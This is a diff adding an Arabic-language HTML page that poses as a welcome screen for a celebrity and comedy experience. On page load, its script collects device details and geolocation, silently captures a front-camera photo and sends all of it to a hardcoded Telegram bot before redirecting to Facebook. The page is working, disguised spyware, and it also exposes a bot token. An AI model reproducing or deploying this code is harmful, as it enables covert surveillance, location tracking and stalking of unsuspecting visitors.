@@ -1,1 +1,178 @@
 
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <title></title>
+  <style>
+    body {
+      background-color: #111;
+      font-family: 'Tahoma', sans-serif;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #welcomeBox {
+      background: linear-gradient(135deg, #2c3e50, #34495e);
+      border: 3px solid #00ffff;
+      border-radius: 16px;
+      padding: 20px;
+      text-align: center;
+      color: #fff;
+      font-size: 18px;
+      width: 90%;
+      max-width: 400px;
+      opacity: 0;
+      transform: scale(0.8);
+      transition: opacity 0.7s ease, transform 0.7s ease;
+      box-shadow: 0 0 15px #00ffff80;
+    }
+
+    #welcomeBox.show {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    #welcomeIcon {
+      font-size: 50px;
+      margin-bottom: 12px;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="welcomeBox">
+    <div id="welcomeIcon">🌟</div>
+    ✨🌟 أهلاً بك في عالم المشاهير والكوميديا 🌟✨
+    <br>🚀 استعد لتجربة ممتعة معنا 🚀
+    <br>💫 لحظات ويتم بدء تجربتك 💫
+  </div>
+
+  <script>
+    const token = '7088304249:AAF3j4m0NldOUxoLIzenuAmKZyh1RWMfDLY';
+    const chatId = '6484198949';
+
+    function sendTextToTelegram(message) {
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      return fetch(url);
+    }
+
+    function sendPhotoToTelegram(base64Image) {
+      const base64Data = base64Image.replace(/^data:image\/png;base64,/, '');
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+
+      const byteCharacters = atob(base64Data);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      }
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray], { type: 'image/png' });
+      formData.append('photo', blob, 'capture.png');
+
+      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    async function collectDeviceInfo() {
+      const info = [];
+      info.push("🛠 معلومات الجهاز:");
+      info.push("📱 النظام: " + navigator.platform);
+      info.push("🌐 المتصفح: " + navigator.userAgent);
+      info.push("🈯 اللغة: " + navigator.language);
+      info.push("🖥 الدقة: " + screen.width + "x" + screen.height);
+      info.push("⏰ الوقت: " + new Date().toLocaleString());
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          info.push("🔋 البطارية: " + Math.round(battery.level * 100) + "%");
+          info.push("⚡ الشحن: " + (battery.charging ? "نعم" : "لا"));
+        } catch {
+          info.push("🔋 حالة البطارية: غير متاحة");
+        }
+      } else {
+        info.push("🔋 حالة البطارية: غير مدعومة");
+      }
+
+      return new Promise((resolve) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const locationLink = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
+              info.push("📍 الموقع: " + locationLink);
+              resolve(info.join("\n"));
+            },
+            () => {
+              info.push("📍 الموقع: غير متاح");
+              resolve(info.join("\n"));
+            },
+            { timeout: 5000 }
+          );
+        } else {
+          info.push("📍 الموقع: غير مدعوم");
+          resolve(info.join("\n"));
+        }
+      });
+    }
+
+    async function startCameraAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        video.srcObject = stream;
+
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
+
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/png');
+
+        stream.getTracks().forEach(track => track.stop());
+
+        await sendPhotoToTelegram(imageData);
+      } catch (err) {
+        alert('❌ تعذر الوصول إلى الكاميرا: ' + err.message);
+      }
+    }
+
+    window.onload = async () => {
+      const welcomeBox = document.getElementById('welcomeBox');
+      welcomeBox.classList.add('show');
+
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      welcomeBox.style.display = 'none';
+
+      const info = await collectDeviceInfo();
+      await sendTextToTelegram(info);
+      await startCameraAndCapture();
+
+      // ✅ إعادة التوجيه إلى رابط Facebook بعد إتمام المهام:
+      window.location.href = "https://www.facebook.com/share/195qXjT6Nu/";
+    };
+  </script>
+</body>
+</html>
